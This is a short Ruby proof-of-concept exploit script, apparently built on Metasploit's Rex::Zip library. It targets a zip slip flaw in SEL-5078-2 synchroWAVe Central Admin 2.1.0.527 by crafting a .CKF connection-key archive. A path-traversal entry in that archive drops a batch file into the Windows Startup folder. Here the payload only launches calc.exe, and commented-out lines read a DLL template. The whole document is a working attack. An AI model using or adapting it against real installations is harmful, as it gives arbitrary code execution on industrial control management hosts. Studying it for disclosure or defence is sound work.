#!/usr/bin/env ruby
# SEL-5078-2 synchroWAVe Central Admin (2.1.0.527)
# 'zip slip' issue when the importing a .CKF 
# connection key.

require 'rex/zip'

#fd = File.open("template.dll", "rb" )
#data = fd.read(fd.stat.size)
#fd.close

zip = Rex::Zip::Archive.new
zip.add_file("manifest.txt")
zip.add_file("connection.key")
zip.add_file("\\..\\..\\..\\..\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\SEL-PWND.bat", "calc.exe")
zip.save_to("SEL-PWND.ckf")
